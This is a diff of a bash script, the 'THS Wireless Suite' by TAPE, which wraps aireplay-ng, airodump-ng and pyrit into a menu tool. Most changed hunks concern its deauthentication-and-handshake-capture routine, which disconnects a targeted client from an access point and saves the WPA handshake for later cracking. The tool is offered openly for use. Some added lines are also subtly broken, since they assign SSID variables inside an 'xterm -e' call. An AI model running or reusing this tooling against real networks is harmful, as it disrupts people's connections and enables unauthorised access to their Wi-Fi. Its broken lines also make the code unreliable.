@@ -2,9 +2,9 @@
 #THS Wireless Suite
 #thsuite.sh v0.1
 #By TAPE
-#Last edit 12-08-2013 23:40
-#Written, and intended for use on CR4CK3RB0X -- THS-OS v3
-#Tested with success on Kali Linux
+#Last edit 13-08-2013 01:30 
+#Written on THS-OS v3 (CR4CK3RB0X) and Kali Linux
+#Tested on both with some options performing better on Kali
 #Source: http://thsuite.googlecode.com/svn/thsuite.sh
 #
 ##
@@ -65,13 +65,13 @@ echo $BLU" _____ _  _ ___      _ _
 f_vers() {
 clear
 f_header
-echo $STD""
-echo "THSuite $GRN$VERS$STD Last edited $GRN$LED$STD
+echo $STD"  By TAPE"
+echo $STD
+echo $STD"THSuite $GRN$VERS$STD Last edited $GRN$LED$STD
 
 Menu based script to simplify the standard wireless commands
-and pre-cracking wireless attacks.
-Written for the THS crew for use on THS-OS 
-By TAPE" 
+used when performing pre-cracking wireless reconnaissance.
+Written for the THS crew, Enjoy Guyz & Galz ;)" 
 f_exit
 }
 #
@@ -933,10 +933,12 @@ done
 #
 echo -n $GRN">$STD Enter scantime duration: $GRN"
 read SCANTIME
-while [ ! `expr $SCANTIME + 1 2> /dev/null` ] ; do
+if [ "$SCANTIME" == "" ] ; then SCANTIME=15 ; fi
+while [ ! `expr $SCANTIME + 1 2> /dev/null` ] && [ "$SCANTIME" != "" ] ; do
 echo $RED">$STD Input error $RED[$STD$SCANTIME$RED]$STD Only numeric values possible."
 echo -n $GRN">$STD Enter scantime duration: $GRN"
 read SCANTIME
+if [ "$SCANTIME" == "" ] ; then SCANTIME=15 ; fi
 done
 #
 echo -n $GRN">$STD Enter monitor interface to send deauth packets: $GRN"
@@ -960,24 +962,34 @@ fi
 #
 echo -n $GRN">$STD Enter number of deauth packets to send: $GRN"
 read DEAUTHS
-while [ ! `expr $DEAUTHS + 1 2> /dev/null` ] ; do
+if [ "$DEAUTHS" == "" ] ; then DEAUTHS=5 ; fi
+while [ ! `expr $DEAUTHS + 1 2> /dev/null` ] && [ "$DEAUTHS" != "" ] ; do
 echo $RED">$STD Input error $RED[$STD$DEAUTHS$RED]$STD Only numeric values possible."
 echo -n $GRN">$STD Enter number of deauth packets to send: $GRN"
 read DEAUTHS
+if [ "$DEAUTHS" == "" ] ; then DEAUTHS=5 ; fi
 done
 echo $GRN">$STD Running airodump to capture credentials and aireplay to deauth client"
 NAME=$(echo $TARGET_AP | sed 's/:/-/g')
-FILENAME="HANDSHAKE-$NAME"
+FILENAME="TEMP-$NAME"
 #
-sleep 4 && xterm -T "THSuite" -geometry 105x20-0-0 -e aireplay-ng $DIFACE -0 $DEAUTHS -a $TARGET_AP -c $TARGET_CL \
+sleep 3 && xterm -T "THSuite" -geometry 105x20-0-0 -e aireplay-ng $DIFACE -0 $DEAUTHS -a $TARGET_AP -c $TARGET_CL \
 & timeout $SCANTIME xterm -T "THSuite" -geometry 105x20-0+0 -e airodump-ng $IFACE -c $TARGET_CHAN --bssid $TARGET_AP --output-format cap -w $SAVEDIR$FILENAME
 #Rename and move capture file 
-HS_FILE=$(echo $TARGET_AP | sed 's/:/-/g')
-mv $SAVEDIR"$FILENAME"* $SAVEDIR"$HS_FILE".cap
+HS_NAME=$(echo $TARGET_AP | sed 's/:/-/g')
+mv $SAVEDIR"$FILENAME"* $SAVEDIR"$HS_NAME".cap
+HANDSHAKE=$SAVEDIR"$HS_NAME".cap
+xterm -e SSID_PARSE=$(tshark -n -R wlan -r $HANDSHAKE | grep SSID | grep $TARGET_AP | sed -n '$p')
+xterm -e TARGET_SSID=$(echo $SSID_PARSE | sed '$p' | sed 's/^.*SSID=//') 
+echo $TARGET_SSID
 #
-echo $GRN">$STD Checking capture$GRN "$SAVEDIR$HS_FILE".cap$STD with pyrit"$STD
-pyrit -r $SAVEDIR"$HS_FILE".cap analyze
+echo $STD
+echo -n $GRN">$STD Check $HANDSHAKE for handshakes? y/N $GRN"
+read CHECK
+if [[ "$CHECK" == "y" || "$CHECK" == "Y" ]] ; then f_handshake_check
+else
 f_exit
+fi
 #
 #
 # Option 2
@@ -1373,11 +1385,10 @@ f_menu
 ##
 ### TO DO
 ######### 
-# - Check how to check channels mon inj iface.
+# - Fix TARGET_SSID reading on manual WPA acquiring function.
 # - Fix correct listing of networks with handshakes (4-2)
 # - Convert cap to hccap 
 # - Optimise code with functions to reduce size / improve performane
 # - Include option to alter save directory
 # - Write general help file / help file for each menu item
-
 
